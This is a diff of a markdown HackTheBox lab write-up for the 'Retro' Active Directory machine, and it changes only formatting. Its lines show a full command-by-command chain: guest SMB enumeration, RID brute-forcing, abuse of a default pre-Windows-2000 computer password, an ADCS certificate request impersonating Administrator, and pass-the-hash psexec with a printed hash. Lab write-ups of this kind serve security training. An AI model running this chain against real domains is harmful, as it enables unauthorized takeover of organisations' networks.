@@ -1,11 +1,12 @@
 ---
 title: Retro - Active Directory
 date: 2025-12-21 00:00:00 +0000
-categories: [HackTheBox Writeups]
+categories: [HackTheBox Writeups, Windows]
 tags: [hackthebox, windows]
 ---
 
-```bash
+
+```
 ares@legion:~/Documents$ sudo nmap -sVC -A -T4 --min-rate 1000 10.129.234.44
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 14:18 EST
 Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
@@ -86,6 +87,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 97.77 seconds
 ```
 
+
 ```
 ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --shares
 SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
@@ -101,7 +103,8 @@ SMB         10.129.234.44   445    DC               Notes
 SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share                                                                                      
 SMB         10.129.234.44   445    DC               Trainees        READ            
 ```
-```bash
+  
+```
 ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'
 SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
@@ -129,7 +132,7 @@ SPIDER_PLUS 10.129.234.44   445    DC               [*] SMB Filtered Shares:  1
 SPIDER_PLUS 10.129.234.44   445    DC               [*] Total folders found:  0
 SPIDER_PLUS 10.129.234.44   445    DC               [*] Total files found:    0
 ```
-```json
+
 ```
 ares@legion:~/HackTheBox/Retro$ ls
 10.129.234.44.json
@@ -158,7 +161,8 @@ Regards
 
 The Admins  
 ```
-```bash
+
+```
 ares@legion:~/HackTheBox/Retro$ cat ToDo.txt     
 Thomas,
 
@@ -173,7 +177,7 @@ James
 ```
 trainee/trainee
 
-```bash
+```
 ares@legion:~/HackTheBox/Retro$ netexec smb $target -u 'guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee userlist2.txt
 Administrator
 Guest
@@ -189,15 +193,16 @@ https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers
 BANKING$/banking
 
 Change password
-```bash
+```
 ares@legion:~/HackTheBox/Retro$ impacket-changepasswd retro.vl/'banking$':banking@$target -newpass 'beer1!' -p rpc-samr
 ```
-![20251125222237.png](/assets/img/htb-writeups/Pasted image 20251125222237.png)
+![[Pasted image 20251125222237.png]]
 
 Validate password change
-```bash
+```
 ares@legion:~/HackTheBox/Retro$ crackmapexec smb $target -u 'banking$' -p 'beer1!'
-```bash
+```
+
 More enum with valid logon creds
 ```
 ares@legion:~/HackTheBox/Retro$ nxc ldap $target -u "banking$" -p 'beer1!' -M adcs
@@ -209,18 +214,20 @@ ADCS        10.129.47.169   389    DC               Found PKI Enrollment Server:
 ADCS        10.129.47.169   389    DC               Found CN: retro-DC-CA
 
 ```
-```bash
+
+```
 certipy-ad find -u 'banking$' -p 'beer1!' -dc-ip $target -vulnerable -stdout
 ```
-![20251125223431.png](/assets/img/htb-writeups/Pasted image 20251125223431.png)
+![[Pasted image 20251125223431.png]]
 
 The CA Name , Template Name and the Minimum RSA Key Length from the Certipy output should be
 noted. Using these, a new certificate should be requested from the RetroClients template, impersonating
 the Administrator user
 (no sid)
-```bash
+```
 ares@legion:~/HackTheBox/Retro$ certipy-ad req -u 'banking$' -p 'beer1!' -dc-ip $target -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -key-size 4096
-```bash
+```
+
 Misssing SID on authentification:
 ```
 ares@legion:~/HackTheBox/Retro$ certipy-ad auth -pfx 'administrator.pfx' -username 'Administrator' -domain 'retro.vl' -dc-ip $target
@@ -232,9 +239,10 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Trying to get TGT...
 [-] Object SID mismatch between certificate and user 'administrator'
 [-] See the wiki for more information
-```bash
+```
+
 Find SID:
-```bash
+```
 ares@legion:~/HackTheBox/Retro$ certipy-ad account -u 'banking$' -p 'beer1!' -dc-ip $target -user 'administrator' read
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
@@ -248,13 +256,16 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     whenCreated                         : 2023-07-23T21:07:55+00:00
     whenChanged                         : 2025-05-05T07:11:09+00:00
 ```
+
 ```
 certipy-ad req -u 'banking$' -p 'beer1!' -dc-ip $target -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500  -key-size 4096
-```bash
-![20251125225107.png](/assets/img/htb-writeups/Pasted image 20251125225107.png)
+```
 
-```bash
+![[Pasted image 20251125225107.png]]
+
+```
 impacket-psexec retro.vl/Administrator@$target -hashes :252fac7066d93dd009d4fd2cd0368389
 ```
+
 
 
